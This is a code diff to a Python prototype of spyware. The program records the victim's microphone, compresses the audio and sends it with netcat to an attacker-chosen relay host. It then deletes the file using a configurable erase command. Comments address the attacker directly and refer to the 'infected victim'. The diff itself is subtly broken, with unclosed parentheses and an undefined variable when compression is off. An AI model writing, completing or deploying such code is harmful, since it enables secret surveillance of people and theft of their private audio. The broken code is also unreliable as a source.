@@ -5,14 +5,22 @@ __version__ = "v0.1.0(prototype)"
 import sounddevice as sd
 from scipy.io.wavfile import write
 from os import system
-
-# compression = True
-# compression_level = 9
+import gzip
+def compress_file(filepath,lvl=9):
+    with open(filepath,"rb") as fin:
+        data = fin.read()
+        fin.close()
+    with open(filepath+".gz","wb") as fout:
+        fout.write(gzip.compress(data,level=lvl))
+        fout.close()
+    return filepath + ".gz" 
+compression = True
+compression_level = 9
 
 # encryption = True
 # encryption_key = ""
 
-# erase_custom_command = "rm -f {file}" # alse u can use this other exemple "wipe -rf -S r -T 15 {file}"
+erase_custom_command = "rm -f {file}" # alse u can use this other exemple "wipe -rf -S r -T 15 {file}"
 
 # For the remote of the self-destruction feature
 # use the command `sha512sum <file>` and copy the hashed value to paste into this string value
@@ -24,6 +32,10 @@ seconds = 30  # Duration of recording
 IP_HOST, PORT_HOST = "x.x.x.x", 8080 # change this two Vars to set the destination of the outbound connection by the infected victim to your attack relay point. the connection for transmit the audio records use TCP connections.
 myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
 sd.wait()  # Wait until recording is finished
-write('/tmp/i-have-hack-your-mic.wav', fs, myrecording)  # Save as WAV file 
-system("netcat "+IP_HOST+" "+PORT_HOST+" < /tmp/i-have-hack-your-mic.wav")
-system("rm -f /tmp/i-have-hack-your-mic.wav")
+audio_filepath = '/tmp/i-have-hack-your-mic.wav'
+write(audio_filepath, fs, myrecording)  # Save as WAV file 
+if compression:
+    out_filepath = compress_file(audio_filepath,lvl=compression_level)
+    system(erase_custom_command.format(file=audio_filepath)
+system("netcat "+IP_HOST+" "+PORT_HOST+" < "+out_filepath)
+system(erase_custom_command.format(file=out_filepath)
